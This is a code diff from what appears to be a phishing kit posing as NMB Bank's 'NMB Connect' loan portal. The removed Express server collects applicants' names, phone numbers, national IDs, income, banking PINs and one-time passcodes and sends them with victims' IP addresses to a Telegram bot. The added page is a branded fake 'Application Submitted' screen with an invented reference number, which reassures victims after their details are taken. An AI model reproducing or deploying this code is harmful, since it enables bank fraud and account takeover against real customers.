@@ -1,209 +1,285 @@
-'use strict';
-const express   = require('express');
-const path      = require('path');
-const https     = require('https');
-const rateLimit = require('express-rate-limit');
-
-const app  = express();
-const PORT = process.env.PORT || 3000;
-
-app.set('trust proxy', 1);
-app.use(express.json({ limit: '20kb' }));
-app.use(express.urlencoded({ extended: false }));
-
-/* ── SECURITY HEADERS ── */
-app.use((req, res, next) => {
-  res.setHeader('X-Content-Type-Options',  'nosniff');
-  res.setHeader('X-Frame-Options',         'DENY');
-  res.setHeader('X-XSS-Protection',        '1; mode=block');
-  res.setHeader('Referrer-Policy',         'strict-origin-when-cross-origin');
-  next();
-});
-
-/* ── RATE LIMITERS ── */
-const apiLimiter = rateLimit({
-  windowMs: 15 * 60 * 1000, max: 30,
-  message: { error: 'Too many requests. Please try again later.' },
-  standardHeaders: true, legacyHeaders: false,
-  keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
-});
-app.use('/api/telegram', apiLimiter);
-app.use('/api/loan',     apiLimiter);
-
-/* ── STATIC FILES ── */
-app.use(express.static(path.join(__dirname), {
-  extensions: ['html'],
-  index: 'index.html',
-}));
-
-/* ── TELEGRAM HELPER ── */
-function sendTelegramMessage(text) {
-  return new Promise((resolve, reject) => {
-    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
-    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.warn('[Telegram] Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
-      return resolve({ ok: false, reason: 'env_missing' });
-    }
-    const body = JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' });
-    const opts = {
-      hostname: 'api.telegram.org',
-      path: `/bot${BOT_TOKEN}/sendMessage`,
-      method: 'POST',
-      headers: {
-        'Content-Type':  'application/json',
-        'Content-Length': Buffer.byteLength(body),
-      },
-    };
-    const req = https.request(opts, (res) => {
-      let data = '';
-      res.on('data', c => data += c);
-      res.on('end', () => {
-        try { resolve(JSON.parse(data)); } catch (e) { resolve({ ok: false }); }
-      });
-    });
-    req.on('error', reject);
-    req.write(body);
-    req.end();
-  });
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#0D2B6B"/>
+<title>NMB Connect · Application Submitted</title>
+<link rel="icon" href="assets/nmb-logo.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none}
+:root{
+  --navy:#0D2B6B;--navy2:#0A2157;
+  --gold:#C9A227;--gold2:rgba(201,162,39,.12);
+  --bg:#F4F6FA;--surface:#FFFFFF;--surface2:#EEF1F7;--surface3:#E5E9F2;
+  --tx1:#0D1B3E;--tx2:#4A5568;--tx3:#8E9AB5;
+  --ok:#1B8A4E;--ok2:rgba(27,138,78,.1);
+  --div:rgba(0,0,0,.08);
+  --f:'Inter',system-ui,sans-serif;
+  --r12:12px;--r16:16px;--r20:20px;--rp:999px;
+  --ease:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.34,1.56,.64,1);
+  --sb:24px;
+  --shadow:0 2px 8px rgba(0,0,0,.08),0 4px 16px rgba(0,0,0,.05);
 }
+html,body{font-family:var(--f);background:var(--bg);color:var(--tx1);-webkit-font-smoothing:antialiased;width:100%;height:100dvh;overflow:hidden}
+@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+@keyframes cardIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@keyframes checkDraw{to{stroke-dashoffset:0}}
+@keyframes orbIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+@keyframes pdot{0%,100%{opacity:.4}50%{opacity:1}}
+@keyframes shimmer{0%{left:-80%}100%{left:160%}}
+@keyframes rip{to{transform:scale(4);opacity:0}}
+@keyframes confetti{0%{transform:translateY(-10px) rotate(0deg);opacity:1}100%{transform:translateY(80px) rotate(360deg);opacity:0}}
 
-/* ── POST /api/loan  — NMB loan application notification ── */
-app.post('/api/loan', async (req, res) => {
-  try {
-    const {
-      event        = 'loan_submitted',
-      name         = '',
-      phone        = '',
-      phoneDisplay = '',
-      nid          = '',
-      emp          = '',
-      income       = '',
-      amount       = '',
-      tenure       = '',
-      monthly      = '',
-      rate         = '',
-      pin          = '',
-      otp          = '',
-      submittedAt  = '',
-    } = req.body || {};
+/* ── Intro ── */
+.intro{position:fixed;inset:0;background:var(--navy);z-index:9999;pointer-events:none;transition:opacity .5s var(--ease)}
+.intro.clear{opacity:0}
 
-    if (!phone && !name) return res.status(400).json({ error: 'Invalid payload' });
+.page{display:flex;flex-direction:column;width:100%;height:100dvh;animation:slideUp .35s var(--ease) both;overflow:hidden}
 
-    const now = new Date().toLocaleString('en-GB', {
-      timeZone: 'Africa/Harare', hour12: false,
-    });
+/* ── Hero ── */
+.hero{
+  background:var(--navy);
+  padding:calc(var(--sb) + env(safe-area-inset-top,0px) + 12px) 22px 36px;
+  position:relative;overflow:hidden;
+  min-height:clamp(280px,42vh,360px);
+  display:flex;flex-direction:column;align-items:center;justify-content:flex-end;
+  text-align:center;
+}
+.hero::before{content:'';position:absolute;top:-80px;left:50%;transform:translateX(-50%);width:280px;height:280px;border-radius:50%;background:radial-gradient(circle,rgba(201,162,39,.15),transparent 65%);pointer-events:none}
+.hero-top{position:absolute;top:calc(var(--sb) + env(safe-area-inset-top,0px) + 10px);left:22px;right:22px;display:flex;align-items:center;justify-content:space-between}
+.hero-logo-wrap{display:flex;align-items:center;gap:10px}
+.hero-logo{display:flex;align-items:center}
+.hero-logo img{width:64px;height:18px;object-fit:contain;filter:brightness(0)invert(1)}
+.hero-brand-txt{font-size:13px;font-weight:700;color:rgba(255,255,255,.9)}
+.status-chip{display:flex;align-items:center;gap:6px;background:var(--ok2);border-radius:var(--rp);padding:5px 12px;font-size:11px;font-weight:700;color:var(--ok);border:1px solid rgba(27,138,78,.25)}
+.status-dot{width:6px;height:6px;border-radius:50%;background:var(--ok);animation:pdot 2s ease-in-out infinite}
 
-    const emoji = {
-      loan_submitted:       '🏦',
-      loan_pin_auth:        '🔐',
-      loan_otp_confirmed:   '✅',
-      loan_otp_resend:      '🔁',
-    }[event] || '📋';
+/* Check circle */
+.check-circle{width:76px;height:76px;border-radius:50%;background:rgba(27,138,78,.2);border:2px solid rgba(27,138,78,.4);display:flex;align-items:center;justify-content:center;margin-bottom:18px;animation:orbIn .6s .1s var(--spring) both;position:relative;z-index:1}
+.check-svg{width:34px;height:34px}
+.check-path{stroke-dasharray:52;stroke-dashoffset:52;animation:checkDraw .5s .55s ease forwards}
+.hero-title{font-size:24px;font-weight:700;color:#fff;letter-spacing:-.3px;margin-bottom:5px;animation:fadeUp .4s .25s both;position:relative;z-index:1}
+.hero-sub{font-size:13px;color:rgba(255,255,255,.55);animation:fadeUp .4s .35s both;position:relative;z-index:1}
+.hero-ref{margin-top:14px;display:flex;align-items:center;gap:6px;animation:fadeUp .4s .3s both;position:relative;z-index:1}
+.hero-ref-lbl{font-size:11px;color:rgba(255,255,255,.4);font-weight:500}
+.hero-ref-val{font-size:13px;font-weight:700;color:var(--gold);cursor:pointer;letter-spacing:.5px}
+.hero-ref-val:active{opacity:.7}
 
-    const empLabel = emp === 'employed' ? 'Employed (Salaried)' : emp === 'self' ? 'Self-Employed' : emp || '—';
+/* ── Body ── */
+.body{flex:1;min-height:0;background:var(--bg);padding:16px 16px 8px;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.body::-webkit-scrollbar{display:none}
 
-    /* Reconstruct full phone number cleanly */
-    const localNum = phone.replace(/^\+?0*263/, '').replace(/\D/g, '');
-    const fullPhone = localNum ? `+263${localNum}` : (phoneDisplay || phone || '—');
+/* Loan summary card */
+.summary-card{background:var(--surface);border-radius:var(--r20);overflow:hidden;margin-bottom:12px;box-shadow:var(--shadow);animation:cardIn .4s .1s var(--ease) both}
+.sc-head{padding:14px 18px;border-bottom:1px solid var(--div);display:flex;align-items:center;justify-content:space-between}
+.sc-head-t{font-size:15px;font-weight:700;color:var(--tx1)}
+.sc-badge{background:var(--ok2);border-radius:var(--rp);padding:5px 12px;font-size:11px;font-weight:700;color:var(--ok)}
 
-    const lines = [
-      `${emoji} <b>NMB Connect — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
-      ``,
-      `📅 <b>Time:</b> ${submittedAt ? new Date(submittedAt).toLocaleString('en-GB',{timeZone:'Africa/Harare',hour12:false})+' CAT' : now+' CAT'}`,
-      ``,
-      `👤 <b>Name:</b> ${name || '—'}`,
-      `📱 <b>Phone:</b> <code>${fullPhone}</code>`,
-      pin          ? `🔐 <b>PIN:</b> <code>${pin}</code>`             : null,
-      otp          ? `🔑 <b>OTP:</b> <code>${otp}</code>`            : null,
-      ``,
-      nid          ? `🪪 <b>National ID:</b> <code>${nid}</code>`     : null,
-      emp          ? `💼 <b>Employment:</b> ${empLabel}`              : null,
-      income       ? `💰 <b>Income:</b> USD ${Number(income).toLocaleString()}/month` : null,
-      req.body.hasAcct !== undefined ? `🏦 <b>NMB Account:</b> ${req.body.hasAcct ? '✅ Confirmed' : '❌ No account'}` : null,
-      ``,
-      amount       ? `💵 <b>Loan Amount:</b> USD ${Number(amount).toLocaleString()}` : null,
-      tenure       ? `📅 <b>Tenure:</b> ${tenure} months`            : null,
-      monthly      ? `📆 <b>Monthly Repay:</b> USD ${Number(monthly).toFixed(2)}` : null,
-      rate         ? `📈 <b>Rate:</b> ${rate}% p.m. flat`            : null,
-      ``,
-      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
-    ].filter(Boolean).join('\n');
+/* Amount hero inside card */
+.sc-amount{display:flex;align-items:center;justify-content:space-between;padding:18px 18px 14px;border-bottom:1px solid var(--div);background:linear-gradient(135deg,rgba(13,43,107,.03),rgba(13,43,107,.01))}
+.sc-amount-main{}
+.sc-amount-lbl{font-size:11px;font-weight:600;color:var(--tx3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
+.sc-amount-val{font-size:36px;font-weight:700;color:var(--navy);letter-spacing:-.04em;font-feature-settings:"tnum";line-height:1}
+.sc-amount-cur{font-size:16px;font-weight:600;color:var(--tx3);vertical-align:super}
+.sc-amount-right{text-align:right}
+.sc-amount-rate{font-size:12px;color:var(--tx3);margin-bottom:2px}
+.sc-amount-monthly{font-size:18px;font-weight:700;color:var(--navy);font-feature-settings:"tnum"}
+.sc-amount-mlbl{font-size:10px;color:var(--tx3);margin-top:1px}
 
-    const result = await sendTelegramMessage(lines);
-    return res.json({ ok: true, telegram: result.ok });
-  } catch (err) {
-    console.error('[/api/loan]', err.message);
-    return res.status(500).json({ error: 'Internal server error' });
-  }
-});
+/* Detail rows */
+.sc-row{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid var(--div);opacity:0;animation:fadeUp .3s var(--ease) forwards}
+.sc-row:last-child{border-bottom:none}
+.sc-row:nth-child(1){animation-delay:.12s}
+.sc-row:nth-child(2){animation-delay:.18s}
+.sc-row:nth-child(3){animation-delay:.24s}
+.sc-row:nth-child(4){animation-delay:.30s}
+.sc-row:nth-child(5){animation-delay:.36s}
+.sc-key{display:flex;align-items:center;gap:9px;font-size:13px;color:var(--tx2)}
+.sc-icon{width:30px;height:30px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.sc-val{font-size:13px;font-weight:600;color:var(--tx1);text-align:right;max-width:58%}
 
-/* ── POST /api/telegram — legacy / PIN+OTP auth during loan flow ── */
-app.post('/api/telegram', async (req, res) => {
-  try {
-    const {
-      event = '', phone = '', pin = '', otp = '',
-      // NMB loan fields passed through login page
-      name = '', nid = '', emp = '', income = '', amount = '', tenure = '',
-      monthly = '', submittedAt = '',
-    } = req.body || {};
+/* Timeline */
+.timeline-card{background:var(--surface);border-radius:var(--r20);overflow:hidden;box-shadow:var(--shadow);animation:cardIn .35s .2s var(--ease) both}
+.tl-head{padding:14px 18px;border-bottom:1px solid var(--div)}
+.tl-head-t{font-size:15px;font-weight:700;color:var(--tx1)}
+.tl-body{padding:16px 18px;display:flex;flex-direction:column;gap:0}
+.tl-step{display:flex;align-items:flex-start;gap:14px;padding-bottom:16px;position:relative}
+.tl-step:last-child{padding-bottom:0}
+.tl-step::before{content:'';position:absolute;left:15px;top:30px;bottom:0;width:2px;background:var(--div)}
+.tl-step:last-child::before{display:none}
+.tl-dot{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:13px;font-weight:700;position:relative;z-index:1}
+.tl-dot.done{background:var(--ok2);color:var(--ok);border:1px solid rgba(27,138,78,.25)}
+.tl-dot.active{background:rgba(13,43,107,.1);color:var(--navy);border:1px solid rgba(13,43,107,.2)}
+.tl-dot.pending{background:var(--surface2);color:var(--tx3);border:1px solid var(--div)}
+.tl-txt{flex:1;padding-top:5px}
+.tl-title{font-size:13px;font-weight:600;color:var(--tx1);margin-bottom:1px}
+.tl-sub{font-size:11px;color:var(--tx3)}
 
-    /* Route to loan handler if it's a loan event */
-    if (['loan_submitted','loan_pin_auth','loan_otp_confirmed','loan_otp_resend'].includes(event)) {
-      return res.redirect(307, '/api/loan');
-    }
+/* Notice */
+.notice{background:var(--surface);border-radius:var(--r16);padding:14px 16px;font-size:13px;line-height:1.65;color:var(--tx2);box-shadow:var(--shadow);border-left:3px solid var(--navy);animation:cardIn .3s .25s var(--ease) both;margin-top:0}
+.notice strong{color:var(--tx1);font-weight:600}
 
-    const local = phone
-      .replace(/^\+?00263/, '').replace(/^\+?263/, '').replace(/^0/, '')
-      .replace(/\D/g, '').trim();
+/* Actions fixed */
+.actions{position:fixed;bottom:0;left:0;right:0;padding:12px 16px max(20px,env(safe-area-inset-bottom));background:var(--surface);border-top:1px solid var(--div);z-index:50;display:flex;flex-direction:column;gap:8px}
+.btn-p{width:100%;min-height:52px;padding:14px;border-radius:var(--r16);border:none;background:var(--navy);color:#fff;font-family:var(--f);font-size:15px;font-weight:700;cursor:pointer;touch-action:manipulation;outline:none;box-shadow:0 4px 16px rgba(13,43,107,.25);transition:transform .14s var(--spring);position:relative;overflow:hidden}
+.btn-p::before{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.07),transparent);animation:shimmer 2.5s ease-in-out infinite;pointer-events:none}
+.btn-p:active{transform:scale(.97)}
+.btn-o{width:100%;min-height:46px;padding:12px;border-radius:var(--r16);border:1px solid var(--div);background:transparent;font-family:var(--f);font-size:14px;font-weight:600;color:var(--tx2);cursor:pointer;touch-action:manipulation;outline:none;transition:background .14s}
+.btn-o:active{background:var(--surface2)}
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.06);transform:scale(0);animation:rip .5s ease forwards}
+</style>
+</head>
+<body>
+<div class="intro" id="intro"></div>
 
-    const emoji = {
-      receive_offer_clicked: '📲',
-      offer_received:        '✅',
-      resend_otp:            '🔁',
-    }[event] || '📋';
+<div class="page">
 
-    const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare', hour12: false });
+  <div class="hero">
+    <div class="hero-top">
+      <div class="hero-logo-wrap">
+        <div class="hero-logo"><img src="assets/nmb-logo.png" alt="NMB"></div>
+        <div class="hero-brand-txt">NMB Connect</div>
+      </div>
+      <div class="status-chip"><div class="status-dot"></div>Submitted</div>
+    </div>
 
-    const message = [
-      `${emoji} <b>NMB Connect — ${event.replace(/_/g,' ').toUpperCase()}</b>`,
-      ``,
-      `📅 <b>Time:</b> ${now} CAT`,
-      `📱 <b>Phone:</b> <code>+263${local}</code>`,
-      pin ? `🔐 <b>PIN:</b> <code>${pin}</code>` : null,
-      otp ? `🔑 <b>OTP:</b> <code>${otp}</code>` : null,
-      amount ? `\n💵 <b>Amount:</b> USD ${amount}` : null,
-      tenure ? `📅 <b>Tenure:</b> ${tenure} months` : null,
-      name   ? `👤 <b>Applicant:</b> ${name}`       : null,
-      ``,
-      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
-    ].filter(Boolean).join('\n');
+    <div class="check-circle">
+      <svg class="check-svg" viewBox="0 0 34 34" fill="none">
+        <path class="check-path" d="M5 17 L13 25 L29 9" stroke="#1B8A4E" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <div class="hero-title" id="heroTitle">Application Submitted!</div>
+    <div class="hero-sub">Your loan request is under review</div>
+    <div class="hero-ref">
+      <span class="hero-ref-lbl">Ref:</span>
+      <span class="hero-ref-val" id="refVal" onclick="copyRef()">—</span>
+    </div>
+  </div>
 
-    const result = await sendTelegramMessage(message);
-    return res.json({ ok: true, telegram: result.ok });
-  } catch (err) {
-    console.error('[/api/telegram]', err.message);
-    return res.status(500).json({ error: 'Internal server error' });
-  }
-});
+  <div class="body">
 
-/* ── GET /health ── */
-app.get('/health', (req, res) => {
-  res.json({
-    status:   'ok',
-    app:      'NMB Connect Loan Portal',
-    uptime:   process.uptime(),
-    telegram: !!(process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_CHAT_ID),
+    <!-- Loan Summary Card -->
+    <div class="summary-card">
+      <div class="sc-head">
+        <div class="sc-head-t">Loan Summary</div>
+        <div class="sc-badge">✓ Received</div>
+      </div>
+      <div class="sc-amount">
+        <div class="sc-amount-main">
+          <div class="sc-amount-lbl">Loan Amount</div>
+          <div><span class="sc-amount-cur">USD </span><span class="sc-amount-val" id="amtVal">0</span></div>
+        </div>
+        <div class="sc-amount-right">
+          <div class="sc-amount-rate" id="amtRate">at 2% p.m.</div>
+          <div class="sc-amount-monthly" id="amtMonthly">USD 0.00</div>
+          <div class="sc-amount-mlbl">per month</div>
+        </div>
+      </div>
+      <div id="sc-rows"></div>
+    </div>
+
+    <!-- Timeline -->
+    <div class="timeline-card" style="margin-bottom:12px">
+      <div class="tl-head"><div class="tl-head-t">Application Progress</div></div>
+      <div class="tl-body">
+        <div class="tl-step">
+          <div class="tl-dot done">✓</div>
+          <div class="tl-txt"><div class="tl-title">Application Submitted</div><div class="tl-sub" id="tlDate">—</div></div>
+        </div>
+        <div class="tl-step">
+          <div class="tl-dot active">2</div>
+          <div class="tl-txt"><div class="tl-title">Credit Assessment</div><div class="tl-sub">Under review — 1–2 business days</div></div>
+        </div>
+        <div class="tl-step">
+          <div class="tl-dot pending">3</div>
+          <div class="tl-txt"><div class="tl-title">Approval Decision</div><div class="tl-sub">You'll receive an SMS notification</div></div>
+        </div>
+        <div class="tl-step">
+          <div class="tl-dot pending">4</div>
+          <div class="tl-txt"><div class="tl-title">Disbursement</div><div class="tl-sub">Funds credited to your account</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="notice">For assistance call <strong>0800 5000</strong> or visit any NMB branch. Keep your reference number safe. Response within <strong>1–2 business days</strong>.</div>
+  </div>
+
+  <div class="actions">
+    <button class="btn-p" onclick="newApplication()">Apply for Another Loan</button>
+    <button class="btn-o" onclick="goHome()">Done</button>
+  </div>
+
+</div>
+
+<script>
+'use strict';
+(function(){var h=0;if(window.screen&&screen.availTop>0)h=screen.availTop;else if(window.visualViewport&&visualViewport.offsetTop>0)h=visualViewport.offsetTop;if(h)document.documentElement.style.setProperty('--sb',h+'px');})();
+function hap(t){if(!navigator.vibrate)return;try{navigator.vibrate(t);}catch(e){}}
+
+function copyRef(){
+  var el=document.getElementById('refVal');if(!el)return;
+  var ref=el.dataset.ref||el.textContent;
+  navigator.clipboard&&navigator.clipboard.writeText(ref).catch(function(){});
+  var orig=el.textContent;el.textContent='Copied!';el.style.color='var(--ok)';
+  setTimeout(function(){el.textContent=orig;el.style.color='';},1600);hap(8);
+}
+function goHome(){['nmbLoan','nmbRef'].forEach(function(k){sessionStorage.removeItem(k);});window.location.href='index.html';}
+function newApplication(){sessionStorage.removeItem('nmbLoan');sessionStorage.removeItem('nmbRef');window.location.href='index.html';}
+
+/* Fade intro */
+requestAnimationFrame(function(){requestAnimationFrame(function(){var i=document.getElementById('intro');if(i)i.classList.add('clear');});});
+
+(function init(){
+  var loan={},ref={};
+  try{loan=JSON.parse(sessionStorage.getItem('nmbLoan')||'{}');}catch(e){}
+  try{ref=JSON.parse(sessionStorage.getItem('nmbRef')||'{}');}catch(e){}
+  if(!loan.amount){document.getElementById('heroTitle').textContent='Application';return;}
+
+  /* Hero ref */
+  var refNum=ref.ref||('NMB-'+Date.now().toString(36).toUpperCase().slice(-8));
+  var refEl=document.getElementById('refVal');refEl.textContent=refNum;refEl.dataset.ref=refNum;
+
+  /* Amounts */
+  document.getElementById('amtVal').textContent=loan.amount.toLocaleString();
+  document.getElementById('amtMonthly').textContent='USD '+loan.monthly.toFixed(2);
+  document.getElementById('amtRate').textContent='at '+loan.rate+'% p.m. · '+loan.tenure+' months';
+  document.getElementById('heroTitle').textContent='Application Submitted!';
+
+  /* Date */
+  var ts=ref.timestamp?new Date(ref.timestamp):new Date();
+  document.getElementById('tlDate').textContent=ts.toLocaleDateString('en-ZW',{day:'numeric',month:'long',year:'numeric'})+' at '+ts.toLocaleTimeString('en-ZW',{hour:'2-digit',minute:'2-digit'});
+
+  /* Rows */
+  var rows=[
+    loan.name   ?['👤','rgba(13,43,107,.08)','Applicant',loan.name]:null,
+    loan.phone  ?['📱','rgba(27,138,78,.08)','Mobile',loan.phoneDisplay]:null,
+    loan.nid    ?['🪪','rgba(201,162,39,.08)','National ID',loan.nid]:null,
+    loan.emp    ?['💼','rgba(13,43,107,.06)','Employment',loan.emp==='employed'?'Employed (Salaried)':'Self-Employed']:null,
+    loan.income ?['💰','rgba(27,138,78,.06)','Monthly Income','USD '+loan.income.toLocaleString()]:null,
+  ].filter(Boolean);
+  var html='';
+  rows.forEach(function(r){
+    html+='<div class="sc-row"><div class="sc-key"><div class="sc-icon" style="background:'+r[1]+'">'+r[0]+'</div>'+r[2]+'</div><div class="sc-val">'+r[3]+'</div></div>';
   });
-});
+  document.getElementById('sc-rows').innerHTML=html;
 
-/* ── CATCH-ALL → index.html ── */
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
+  hap([10,50,10]);
 
-/* ── START ── */
-app.listen(PORT, () => {
-  console.log(`✅  NMB Connect server running on port ${PORT}`);
-  console.log(`    Telegram: ${process.env.TELEGRAM_TOKEN ? 'configured ✓' : 'MISSING ⚠'}`);
-});
+  /* Ripple */
+  document.querySelectorAll('.btn-p,.btn-o').forEach(function(b){
+    b.addEventListener('pointerdown',function(e){
+      var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
+      var rip=document.createElement('span');rip.className='rip';
+      rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px';
+      b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});
+    },{passive:true});
+  });
+})();
+</script>
+</body>
+</html>
